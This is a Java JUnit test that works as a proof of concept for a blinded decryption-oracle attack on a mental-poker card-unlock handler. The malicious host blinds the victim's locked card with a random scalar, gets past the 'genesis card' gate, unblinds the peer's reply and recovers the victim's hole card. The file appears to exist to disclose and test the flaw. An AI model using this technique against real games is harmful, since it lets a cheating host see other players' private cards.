/*
 * PoC: blinded decryption-oracle attack against the REQ_SRA_UNLOCK_BATCH
 * handler's GATE 6 ("result must not resolve to a genesis card").
 *
 * Models exactly what a peer does when the host asks it to strip its pocket
 * lock from a payload (WaitingRoomFrame REQ_SRA_UNLOCK_BATCH handler):
 *   1) check the payload points are on the curve (arePointsOnCurve),
 *   2) apply the peer's own pocket-unlock scalar,
 *   3) GATE 6: refuse if ANY 32-byte chunk resolves to a genesis card,
 *   4) otherwise return the unlocked bytes to the host.
 *
 * The test shows:
 *   - The naive attack (host feeds the victim's single-locked pocket as-is) is
 *     correctly caught by GATE 6 -> peer refuses.
 *   - The blinded attack (host feeds r * pocket) sails through every gate:
 *     arePointsOnCurve passes, GATE 6 does NOT fire, and the host recovers the
 *     victim's hole card by unblinding with r^-1.
 */
package com.tonikelope.coronapoker.sra;

import com.tonikelope.coronapoker.CryptoSRA;
import com.tonikelope.coronapoker.Helpers;
import java.security.SecureRandom;
import java.util.Arrays;
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class CryptoSRABlindOracleTest {

    private static final int CARD_BYTES = 32;

    @Test
    public void testBlindingDefeatsGenesisGate() {
        if (Helpers.CSPRNG_GENERATOR == null) {
            Helpers.CSPRNG_GENERATOR = new SecureRandom();
        }

        // ---- Victim peer's pocket key (k_pocket) ----
        byte[] victimLock = CryptoSRA.generateLockScalar();
        byte[] victimUnlock = CryptoSRA.getUnlockScalar(victimLock);

        // ---- The victim's single-locked pocket as the malicious host holds it ----
        // After the per-recipient cascade, the host possesses P = victimLock * G_card
        // (every other peer already stripped their lock; only the victim's lock
        // remains). The host broadcasts exactly this as POCKET_CARDS#victim#...
        byte[] genesis = CryptoSRA.getGenesisDeck();
        byte[] realCard = Arrays.copyOfRange(genesis, 10 * CARD_BYTES, 11 * CARD_BYTES); // card index 10
        byte[] singleLocked = CryptoSRA.applyCommutativeLock(realCard, victimLock);

        // ===== NAIVE ATTACK: host feeds the single-locked pocket as-is =====
        // The peer would apply its unlock and GATE 6 sees a genesis card -> refuses.
        assertTrue(CryptoSRA.arePointsOnCurve(singleLocked), "single-locked point is on curve");
        byte[] naiveUnlocked = CryptoSRA.applyCommutativeLock(singleLocked, victimUnlock);
        int naiveIdx = CryptoSRA.resolveCardIndex(naiveUnlocked);
        assertEquals(10, naiveIdx,
                "naive: stripping the victim's lock yields the genesis card -> GATE 6 WOULD fire and the peer refuses");

        // ===== BLINDED ATTACK: host feeds r * P with a random r it controls =====
        byte[] r = CryptoSRA.generateLockScalar();
        byte[] rInv = CryptoSRA.getUnlockScalar(r);
        byte[] blinded = CryptoSRA.applyCommutativeLock(singleLocked, r); // r * victimLock * G_card

        // GATE 4: still a valid curve point -> passes.
        assertTrue(CryptoSRA.arePointsOnCurve(blinded),
                "blinded payload is on the curve -> arePointsOnCurve gate passes");

        // The peer applies its pocket-unlock (this is all the handler does to the bytes).
        byte[] peerOutput = CryptoSRA.applyCommutativeLock(blinded, victimUnlock); // r * G_card

        // GATE 6: does the peer's output resolve to a genesis card? If not, the
        // handler happily returns peerOutput to the host.
        int gate6Idx = CryptoSRA.resolveCardIndex(peerOutput);
        assertEquals(-1, gate6Idx,
                "BLINDED: peer output is r*G_card, NOT a genesis point -> GATE 6 does NOT fire, peer returns the bytes");

        // ===== Host unblinds and recovers the victim's hole card =====
        byte[] recovered = CryptoSRA.applyCommutativeLock(peerOutput, rInv); // r^-1 * r * G_card = G_card
        int recoveredIdx = CryptoSRA.resolveCardIndex(recovered);

        assertEquals(10, recoveredIdx,
                "CRITICAL: the malicious host recovered the victim's hole card index via blinded oracle");
        assertNotEquals(-1, recoveredIdx, "host learned the private card");
    }
}
